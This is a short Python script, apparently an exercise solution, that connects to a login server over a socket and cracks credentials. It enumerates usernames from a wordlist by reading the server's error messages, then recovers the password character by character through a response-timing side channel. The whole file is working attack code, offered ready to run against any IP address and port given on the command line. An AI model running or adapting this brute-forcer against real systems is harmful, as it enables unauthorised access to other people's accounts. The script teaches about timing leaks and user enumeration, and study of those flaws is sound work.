import argparse
import json
import socket
import sys
import time

BUFFER_SIZE = 1024

# Define available characters
NUMBERS = "0123456789"
CHARS_LOWER = "abcdefghijklmnopqrstuvwxyz"
CHARS_UPPER = CHARS_LOWER.upper()
CHARACTERS = NUMBERS + CHARS_LOWER + CHARS_UPPER

# Create arg parser
parser = argparse.ArgumentParser(description="This program attempts to connect to the server.")

parser.add_argument("ip", help="You need to provide an IP address")
parser.add_argument("port", help="You need to provide a port")

args = parser.parse_args()


def convert_to_json(username, password):
    """
    Convert the given username and password to JSON format
    :return: login and password in JSON format
    """
    password_dict = {
        "login": username,
        "password": password
    }
    password_json = json.dumps(password_dict, indent=4)
    return password_json


def check_response(login_detail):
    """
    Send the login info to the server and get the response.
    :param login_detail: login and password in JSON format
    :return: the decoded response content (str)
    """
    encoded_msg = login_detail.encode()
    client_socket.send(encoded_msg)

    response = client_socket.recv(BUFFER_SIZE)
    response = response.decode()

    response_dict = json.loads(response)
    response_info = response_dict["result"]

    return response_info


def find_username():
    """
    Use the given common login names to find the correct login name. The response time of each attempt is collected.
    :return: login name, a list of response time of the server
    """
    with open("logins.txt") as file:
        logins = file.read().splitlines()

        # create a list to gather normal response time
        response_list = []
        for login in logins:
            login_json = convert_to_json(login, " ")

            start = time.perf_counter()
            response = check_response(login_json)
            end = time.perf_counter()
            total_time = end - start
            response_list.append(total_time)

            if response == "Wrong password!":  # "Wrong password!" means the login name is correct
                return login, response_list


def find_password(username, outlier_value):
    """
    Find the correct password using brute force. If the correct password is found, it will be printed in json format
    and the program will stop.
    :param username: the correct login name
    :param outlier_value: the execution time threshold to detect delays generated by the server by handling exceptions.
    """
    password = ""
    while True:
        for char in CHARACTERS:
            test_pw = password + char
            login_json = convert_to_json(username, test_pw)

            start = time.perf_counter()
            response = check_response(login_json)
            end = time.perf_counter()
            total_time = end-start

            if response == "Connection success!":
                print(login_json)
                sys.exit()

            if total_time > outlier_value:  # correct character detected
                password += char
                break


# Create a client socket
with socket.socket() as client_socket:
    address = (args.ip, int(args.port))
    client_socket.connect(address)

    login_name, time_list = find_username()
    response_threshold = 10 * max(time_list)

    find_password(login_name, response_threshold)